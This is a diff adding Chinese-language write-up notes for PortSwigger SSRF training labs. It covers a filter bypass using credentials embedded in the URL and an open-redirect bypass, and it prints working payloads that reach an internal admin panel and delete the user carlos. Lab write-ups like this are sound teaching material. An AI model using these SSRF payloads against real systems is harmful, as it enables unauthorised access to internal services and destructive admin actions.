@@ -122,6 +122,7 @@ To solve the lab, change the stock check URL to access the admin interface at ht
 
 The developer has deployed an anti-SSRF defense you will need to bypass. 
 ### 題目解釋
+用 URL 上帶帳號密碼的方法來騙 Domain
 
 ### 解答
 
@@ -149,3 +150,50 @@ http://localhost:80#@stock.weliketoshop.net/
 http://localhost:80%2523@stock.weliketoshop.net/admin/delete?username%3dcarlos
 ```
 
+## [Lab: SSRF with filter bypass via open redirection vulnerability](https://portswigger.net/web-security/ssrf/lab-ssrf-filter-bypass-via-open-redirection)
+
+### 題目敘述
+ This lab has a stock check feature which fetches data from an internal system.
+
+To solve the lab, change the stock check URL to access the admin interface at http://192.168.0.12:8080/admin and delete the user carlos.
+
+The stock checker has been restricted to only access the local application, so you will need to find an open redirect affecting the application first. 
+### 題目解釋
+尋找網頁其他地方的 Open redirect
+
+### 解答
+
+送出去發現他只有帶了下面這樣的參數
+```
+%2Fproduct%2Fstock%2Fcheck%3FproductId%3D1%26storeId%3D1
+```
+
+如果亂輸入
+
+```
+stockApi=%2F..%2F..%2F..%2F..%2F..%index.php
+```
+
+他會噴錯
+
+```
+"Invalid external stock check url 'Malformed escape pair at index 34: http://localhost:80/../../../../..%index.php'"
+```
+
+觀察網頁原始碼會發現有 Next Product 的功能可以用
+
+```
+/product/nextProduct?currentProductId=1&path=/product?productId=2">| Next product</a>
+```
+
+所以使用
+
+```
+%2Fproduct%2FnextProduct%3Fpath%3Dhttp%3A%2F%2F192.168.0.12%3A8080/admin
+```
+
+就能看到 admin panel
+
+```
+%2Fproduct%2FnextProduct%3Fpath%3Dhttp%3A%2F%2F192.168.0.12%3A8080/admin/delete?username=carlos
+```
